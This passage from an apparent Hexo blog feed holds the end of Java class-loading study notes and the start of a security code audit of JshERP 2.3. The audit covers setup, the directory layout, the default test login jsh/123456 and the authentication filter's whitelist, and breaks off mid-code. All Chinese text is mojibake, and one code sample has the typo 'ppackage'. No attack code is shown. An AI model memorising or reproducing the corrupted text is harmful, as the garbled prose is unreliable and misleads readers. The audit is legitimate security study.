è½½æœºåˆ¶å’Œå¯¹è±¡åˆ›å»ºè¿‡ç¨‹</font></p><p><a href="https://segmentfault.com/a/1190000023876273">https://segmentfault.com/a/1190000023876273</a></p><p><font style="color:rgb(60, 60, 67);">ç±»åŠ è½½è¿‡ç¨‹è¯¦è§£</font></p><p><a href="https://javaguide.cn/java/jvm/class-loading-process.html">https://javaguide.cn/java/jvm/class-loading-process.html</a></p></blockquote><h3 id="ç±»åŠ è½½è¿‡ç¨‹ï¼š"><a href="#ç±»åŠ è½½è¿‡ç¨‹ï¼š" class="headerlink" title="ç±»åŠ è½½è¿‡ç¨‹ï¼š"></a>ç±»åŠ è½½è¿‡ç¨‹ï¼š</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757858.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757062.png"></p><ul><li>**åŠ è½½ï¼š**å°†ç±»çš„ class æ–‡ä»¶å­—èŠ‚ç åŠ è½½åˆ°å†…å­˜ï¼Œå¹¶å°†é™æ€æ•°æ®è½¬åŒ–ä¸ºæ–¹æ³•åŒºçš„è¿è¡Œæ—¶æ•°æ®ç»“æ„ï¼Œç„¶åç”Ÿæˆä¸€ä¸ª java.lang.Class å¯¹è±¡</li><li>**é“¾æ¥ï¼š**å°†javaç±»äºŒè¿›åˆ¶æ•°æ®åˆå¹¶åˆ° JREä¸­<ul><li>**éªŒè¯ï¼š**ç¡®ä¿åŠ è½½çš„ç±»ä¿¡æ¯ç¬¦åˆJVMè§„èŒƒï¼Œæ²¡æœ‰å®‰å…¨æ–¹é¢çš„é—®é¢˜</li><li>**å‡†å¤‡ï¼š**æ­£å¼ä¸ºç±»å˜é‡ ï¼ˆstaticï¼‰ åˆ†é…å†…å­˜å¹¶è®¾ç½®ç±»å˜é‡é»˜è®¤åˆå§‹å€¼çš„é˜¶æ®µï¼ˆæ‰€ä»¥è¯´staticåœ¨åˆå§‹åŒ–ä¹‹å‰å°±å·²ç»æœ‰äº†ä¸€ä¸ªå€¼ï¼‰ï¼Œè¿™äº›å†…å­˜éƒ½å°†åœ¨æ–¹æ³•åŒºä¸­è¿›è¡Œåˆ†é…</li><li>**è§£æï¼š**è™šæ‹Ÿæœºå°†å¸¸é‡æ± å†…çš„ç¬¦å·å¼•ç”¨æ›¿æ¢ä¸ºç›´æ¥å¼•ç”¨çš„è¿‡ç¨‹</li></ul></li><li>**åˆå§‹åŒ–ï¼š**æ‰§è¡Œåˆå§‹åŒ–æ–¹æ³• <code>&lt;clinit&gt; ()</code>æ–¹æ³•çš„è¿‡ç¨‹ï¼Œæ˜¯ç±»åŠ è½½çš„æœ€åä¸€æ­¥ï¼Œè¿™ä¸€æ­¥ JVM æ‰å¼€å§‹çœŸæ­£æ‰§è¡Œç±»ä¸­å®šä¹‰çš„ Java ç¨‹åºä»£ç (å­—èŠ‚ç )ã€‚<code>&lt;clinit&gt; ()</code>æ–¹æ³•ä¼šå°†è¯¥ç±»çš„é™æ€å˜é‡åˆå¹¶ã€‚</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.reflection;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test05</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">A</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">A</span>();<br>        System.out.println(A.m);<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        1ã€åŠ è½½åˆ°å†…å­˜ï¼Œä¼šåœ¨å †äº§ç”Ÿä¸€ä¸ªç±»å¯¹åº”çš„ Class å¯¹è±¡</span><br><span class="hljs-comment">        2ã€é“¾æ¥ï¼Œé“¾æ¥ç»“æŸå m=0</span><br><span class="hljs-comment">        3ã€åˆå§‹åŒ–</span><br><span class="hljs-comment">            &lt;clinit&gt;()&#123;</span><br><span class="hljs-comment">                System.out.println(&quot;Aç±»é™æ€ä»£ç å—åˆå§‹åŒ–&quot;);</span><br><span class="hljs-comment">                m = 300;</span><br><span class="hljs-comment">                m = 100;</span><br><span class="hljs-comment">            &#125;</span><br><span class="hljs-comment">            m = 100</span><br><span class="hljs-comment">         */</span><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>&#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Aç±»é™æ€ä»£ç å—åˆå§‹åŒ–&quot;</span>);<br>        m = <span class="hljs-number">300</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">A</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Aç±»çš„æ— å‚æ„é€ åˆå§‹åŒ–&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ç±»åŠ è½½å™¨ï¼š"><a href="#ç±»åŠ è½½å™¨ï¼š" class="headerlink" title="ç±»åŠ è½½å™¨ï¼š"></a>ç±»åŠ è½½å™¨ï¼š</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311758397.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java">ppackage com.kuang.reflection;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test07</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br><br>        <span class="hljs-comment">//è·å–ç³»ç»Ÿç±»çš„åŠ è½½å™¨</span><br>        ClassLoader systemClassLoader=ClassLoader.getSystemClassLoader();<br>        System.out.println(systemClassLoader);<br><br>        <span class="hljs-comment">//è·å–ç³»ç»Ÿç±»çš„åŠ è½½å™¨çš„çˆ¶ç±»åŠ è½½å™¨-&gt;æ‰©å±•ç±»åŠ è½½å™¨</span><br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">parent</span> <span class="hljs-operator">=</span> systemClassLoader.getParent();<br>        System.out.println(parent);<br><br>        <span class="hljs-comment">//è·å–æ‰©å±•ç±»åŠ è½½å™¨çš„çˆ¶ç±»åŠ è½½å™¨--&gt;æ ¹åŠ è½½å™¨ï¼ˆc/c++ï¼‰</span><br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">parent1</span> <span class="hljs-operator">=</span> parent.getParent();<br>        System.out.println(parent1);<br><br>        <span class="hljs-comment">//æµ‹è¯•å½“å‰ç±»æ˜¯å“ªä¸ªç±»åŠ è½½å™¨åŠ è½½çš„</span><br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.kuang.reflection.Test07&quot;</span>).getClassLoader();<br>        System.out.println(classLoader);<br><br>        <span class="hljs-comment">//æµ‹è¯• jdk å†…éƒ¨çš„ç±»æ˜¯è°åŠ è½½çš„</span><br>        classLoader=Class.forName(<span class="hljs-string">&quot;java.lang.Object&quot;</span>).getClassLoader();<br>        System.out.println(classLoader);<br><br>        <span class="hljs-comment">//è·å¾—ç³»ç»Ÿç±»åŠ è½½å™¨å¯ä»¥åŠ è½½çš„è·¯å¾„</span><br>        System.out.println(System.getProperty(<span class="hljs-string">&quot;java.class.path&quot;</span>));<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\charsets.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\deploy.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\access-bridge-64.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\cldrdata.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\dnsns.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\jaccess.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\jfxrt.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\localedata.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\nashorn.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\sunec.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\sunjce_provider.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\sunmscapi.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\sunpkcs11.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\zipfs.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\javaws.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\jce.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\jfr.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\jfxswt.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\jsse.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\management-agent.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\plugin.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\resources.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\rt.jar;</span><br><span class="hljs-comment">        D:\JavaCode\study_code\annotation&amp;reflection\annotation\target\classes;</span><br><span class="hljs-comment">        C:\Users\SZZY\AppData\Local\Programs\IntelliJ IDEA Ultimate\lib\idea_rt.jar</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">         */</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311758656.png"></p><h3 id="åŒäº²å§”æ´¾æœºåˆ¶"><a href="#åŒäº²å§”æ´¾æœºåˆ¶" class="headerlink" title="åŒäº²å§”æ´¾æœºåˆ¶"></a>åŒäº²å§”æ´¾æœºåˆ¶</h3><p>å‚è€ƒï¼š<a href="https://javaguide.cn/java/jvm/classloader.html#%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%A8%A1%E5%9E%8B">https://javaguide.cn/java/jvm/classloader.html#%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%A8%A1%E5%9E%8B</a></p><p><a href="https://www.cnblogs.com/luckforefforts/p/13642685.html">https://www.cnblogs.com/luckforefforts/p/13642685.html</a></p><p><font style="color:rgb(89, 97, 114);">å¦‚æœä¸€ä¸ªç±»åŠ è½½å™¨æ”¶åˆ°äº†ç±»åŠ è½½çš„è¯·æ±‚ï¼Œå®ƒé¦–å…ˆä¸ä¼šè‡ªå·±å»å°è¯•åŠ è½½è¿™ä¸ªç±»ï¼Œè€Œæ˜¯æŠŠè¿™ä¸ªè¯·æ±‚å§”æ´¾ç»™çˆ¶ç±»åŠ è½½å™¨å»å®Œæˆï¼Œæ¯ä¸€ä¸ªå±‚æ¬¡çš„åŠ è½½å™¨éƒ½æ˜¯å¦‚æ­¤ï¼Œå› æ­¤æ‰€æœ‰çš„ç±»åŠ è½½è¯·æ±‚éƒ½ä¼šä¼ ç»™é¡¶å±‚çš„å¯åŠ¨ç±»åŠ è½½å™¨ï¼Œåªæœ‰å½“çˆ¶åŠ è½½å™¨åé¦ˆè‡ªå·±æ— æ³•å®Œæˆè¯¥åŠ è½½è¯·æ±‚ï¼ˆè¯¥åŠ è½½å™¨çš„æœç´¢èŒƒå›´ä¸­æ²¡æœ‰æ‰¾åˆ°å¯¹åº”çš„ç±»ï¼‰æ—¶ï¼Œå­åŠ è½½å™¨æ‰ä¼šå°è¯•è‡ªå·±å»åŠ è½½ã€‚</font></p><h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><p><font style="color:rgb(34, 34, 38);">javaåºåˆ—åŒ–ä¸ååºåˆ—åŒ–å…¨è®²è§£</font></p><p><a href="https://blog.csdn.net/mocas_wang/article/details/107621010">https://blog.csdn.net/mocas_wang&#x2F;article&#x2F;details&#x2F;107621010</a></p><p><font style="color:rgb(37, 41, 51);">ä¸ºä»€ä¹ˆHashMapè¦è‡ªå·±å®ç°writeObjectå’ŒreadObjectæ–¹æ³•ï¼Ÿ</font></p><p><a href="https://juejin.cn/post/6844903954774491144">https://juejin.cn/post/6844903954774491144</a></p><p><font style="color:rgb(37, 41, 51);">è°ˆè°ˆJavaåå°„ï¼šä»å…¥é—¨åˆ°å®è·µï¼Œå†åˆ°åŸç†</font></p><p><a href="https://juejin.cn/post/6844904025607897096">https://juejin.cn/post/6844904025607897096</a></p><p><font style="color:rgb(25, 27, 31);">è®¾è®¡æ¨¡å¼ï¼ˆå››ï¼‰â€”â€”ææ‡‚ä»€ä¹ˆæ˜¯ä»£ç†æ¨¡å¼</font></p><p><a href="https://zhuanlan.zhihu.com/p/72644638">https://zhuanlan.zhihu.com/p/72644638</a></p><p><font style="color:rgb(33, 37, 41);">Javaç±»åŠ è½½æœºåˆ¶å’Œå¯¹è±¡åˆ›å»ºè¿‡ç¨‹</font></p><p><a href="https://segmentfault.com/a/1190000023876273">https://segmentfault.com/a/1190000023876273</a></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java å­¦ä¹ </tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åå¤ERP 2.3 ä»£ç å®¡è®¡</title>
    <link href="/2025/08/20/JshERP-2.3%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2025/08/20/JshERP-2.3%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/jishenghua/jshERP/releases/tag/2.3">https://github.com/jishenghua/jshERP/releases/tag/2.3</a></p><h1 id="ç¯å¢ƒæ­å»ºï¼š"><a href="#ç¯å¢ƒæ­å»ºï¼š" class="headerlink" title="ç¯å¢ƒæ­å»ºï¼š"></a>ç¯å¢ƒæ­å»ºï¼š</h1><p>MySQL 5.7.26ï¼ŒIDEAï¼ŒMaven 3.9.1ï¼ŒJDK 1.8ï¼Œ </p><p>æ•°æ®åº“æ–°å»ºjsh_erpæ•°æ®åº“ï¼Œå¯¼å…¥sqlæ–‡ä»¶</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201347449.png"><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201347937.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348745.png">IDEA çš„ JDK ç‰ˆæœ¬åˆ‡æ¢ä¸º1.8</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508120917726.png"></p><p>Mavenæ„å»º</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348181.png"></p><p>è¿è¡Œ ErpApplication.java å¯åŠ¨ç¨‹åº</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348557.png"><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348403.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508120919189.png"></p><h1 id="ç›®å½•åˆ†æ"><a href="#ç›®å½•åˆ†æ" class="headerlink" title="ç›®å½•åˆ†æ"></a>ç›®å½•åˆ†æ</h1><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348041.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348213.png"></p><p>è¿™ä¸ªé¡¹ç›®çš„ç»“æ„æ›´åƒæ˜¯ MVC æ¶æ„ï¼ˆ Mapper&#x2F;MapperXMLï¼› Controller  ï¼‰ï¼Œåˆå¢åŠ äº†  Service å±‚ ã€‚</p><ul><li>Maven Assembly æ’ä»¶ï¼Œç”¨äºå¸®åŠ©æ‰“åŒ…ï¼› assembly.xml  æ˜¯æ‰“åŒ…çš„é…ç½®æ–‡ä»¶</li><li>bin ä¸­çš„æ–‡ä»¶éƒ½æ˜¯ jshERP çš„è¿è¡Œè„šæœ¬</li><li>resources&#x2F;mapper_xmlï¼š MyBatis æ¡†æ¶çš„ SQL æ˜ å°„é…ç½®æ–‡ä»¶ï¼Œ â€œæ•°æ®åº“æ“ä½œè¯´æ˜ä¹¦â€  </li><li>logback-spring.xmlï¼šæ—¥å¿—æ–‡ä»¶è¾“å‡ºé…ç½®</li><li>java<ul><li>config<ul><li><font style="color:#080808;background-color:#ffffff;">PluginBeanConfig.java  æ’ä»¶ç®¡ç†å™¨ Bean</font></li><li><font style="color:#080808;background-color:#ffffff;">PluginConfiguration.java  é…ç½®æ’ä»¶ç³»ç»Ÿçš„è¿è¡Œç¯å¢ƒå’Œå‚æ•°  </font></li><li><font style="color:#080808;background-color:#ffffff;"> Swagger2Config.java      ç”¨äºç”Ÿæˆ RESTful API æ–‡æ¡£ , æä¾›æ–‡æ¡£å…ƒä¿¡æ¯  </font></li><li><font style="color:#080808;background-color:#ffffff;"> TenantConfig.java  é¡¹ç›®æ•°æ®åº“è®¿é—®çš„</font>ç»Ÿä¸€æ‹¦æˆªå™¨å’Œæ’ä»¶é…ç½®ä¸­å¿ƒ</li><li>WebConfig.java æŒ‡å®šå‰ç«¯é™æ€æ–‡ä»¶å­˜æ”¾ä½ç½®ï¼Œ åœ¨ Spring Boot å†…ç½® Web æœåŠ¡å™¨ä¸­ç”Ÿæ•ˆ</li></ul></li><li>constants     <ul><li>BusinessConstants  <font style="color:#080808;background-color:#ffffff;">ä¸šåŠ¡å­—å…¸ç±»</font></li><li><font style="color:#080808;background-color:#ffffff;"> ExceptionConstants    å¼‚å¸¸ä¸è¿”å›ç ç®¡ç†ç±»  </font></li></ul></li><li>controller      Web å±‚æ¥å£  </li><li>datasource      æ•°æ®æºå’Œæ•°æ®åº“è®¿é—®é…ç½®  </li><li>exception    å¼‚å¸¸å¤„ç†  </li><li>filter<ul><li>LogCostFilter   è‡ªå®šä¹‰ Servlet è¿‡æ»¤å™¨ï¼Œ æ§åˆ¶ç”¨æˆ·è®¿é—®æƒé™å’Œç™»å½•è¯·æ±‚å¤„ç†</li></ul></li><li>service     ä¸šåŠ¡é€»è¾‘å±‚  </li><li>utils    å·¥å…·ç±»  </li><li>ErpApplication.java    å…¥å£ç±»ï¼Œå‚è€ƒ<a href="https://www.yuque.com/taohuayuanpang/kfw7zl/cqdlt0kgwyh524ay#vrt3I">SpringBoot-æ³¨è§£ @SpringBootApplication åˆ†æ</a></li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//å£°æ˜ springbootï¼Œç»„åˆäº†@SpringBootConfiguration @EnableAutoConfiguration @ComponentScann</span><br><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-comment">//MyBatis Mapper æ¥å£æ‰«æè·¯å¾„</span><br><span class="hljs-meta">@MapperScan(&quot;com.jsh.erp.datasource.mappers&quot;)</span><br><span class="hljs-meta">@ServletComponentScan</span><br><span class="hljs-meta">@EnableScheduling</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ErpApplication</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ConfigurableApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> SpringApplication.run(ErpApplication.class, args);<br>        <span class="hljs-type">Environment</span> <span class="hljs-variable">environment</span> <span class="hljs-operator">=</span> context.getBean(Environment.class);<br>        System.out.println(<span class="hljs-string">&quot;å¯åŠ¨æˆåŠŸï¼Œè®¿é—®åœ°å€ï¼šhttp://&quot;</span> + ComputerInfo.getIpAddr() + <span class="hljs-string">&quot;:&quot;</span><br>                           + environment.getProperty(<span class="hljs-string">&quot;server.port&quot;</span>) + <span class="hljs-string">&quot;ï¼Œæµ‹è¯•ç”¨æˆ·ï¼šjshï¼Œå¯†ç ï¼š123456&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h1><h2 id="1ã€LogCostFilter-java"><a href="#1ã€LogCostFilter-java" class="headerlink" title="1ã€LogCostFilter.java"></a>1ã€LogCostFilter.java</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.jsh.erp.filter;<br><br><span class="hljs-keyword">import</span> org.springframework.util.StringUtils;<br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebFilter;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebInitParam;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> java.util.regex.Matcher;<br><span class="hljs-keyword">import</span> java.util.regex.Pattern;<br><br><span class="hljs-meta">@WebFilter(</span><br><span class="hljs-meta">    filterName = &quot;LogCostFilter&quot;,</span><br><span class="hljs-meta">    //è¿‡æ»¤å™¨å¯¹æ‰€æœ‰è·¯å¾„éƒ½ç”Ÿæ•ˆ</span><br><span class="hljs-meta">    urlPatterns = &#123;&quot;/*&quot;&#125;,</span><br><span class="hljs-meta">    initParams = &#123;</span><br><span class="hljs-meta">        //è¦å¿½ç•¥çš„é™æ€èµ„æº</span><br><span class="hljs-meta">        @WebInitParam(name = &quot;ignoredUrl&quot;, value = &quot;.css#.js#.jpg#.png#.gif#.ico&quot;),</span><br><span class="hljs-meta">        //å…è®¸æœªç™»å½•è®¿é—®çš„è·¯å¾„</span><br><span class="hljs-meta">        @WebInitParam(name = &quot;filterPath&quot;, value = &quot;/user/login#/user/registerUser#/v2/api-docs&quot;)</span><br><span class="hljs-meta">    &#125;</span><br><span class="hljs-meta">)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LogCostFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FILTER_PATH</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;filterPath&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">IGNORED_PATH</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ignoredUrl&quot;</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> List&lt;String&gt; ignoredList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>    <span class="hljs-keyword">private</span> String[] allowUrls;<br>    <span class="hljs-keyword">private</span> String[] ignoredUrls;<br><br>    <span class="hljs-comment">//å°† filterPath å’Œ ignoredUrl è§£ææˆ allowUrls å’Œ ignoredListï¼ˆç™½åå•ï¼‰ï¼Œç”¨äºåç»­ doFilter åˆ¤æ–­</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">filterPath</span> <span class="hljs-operator">=</span> filterConfig.getInitParameter(FILTER_PATH);<br>        <span class="hljs-keyword">if</span> (!StringUtils.isEmpty(filterPath)) &#123;<br>            allowUrls = filterPath.contains(<span class="hljs-string">&quot;#&quot;</span>) ? filterPath.split(<span 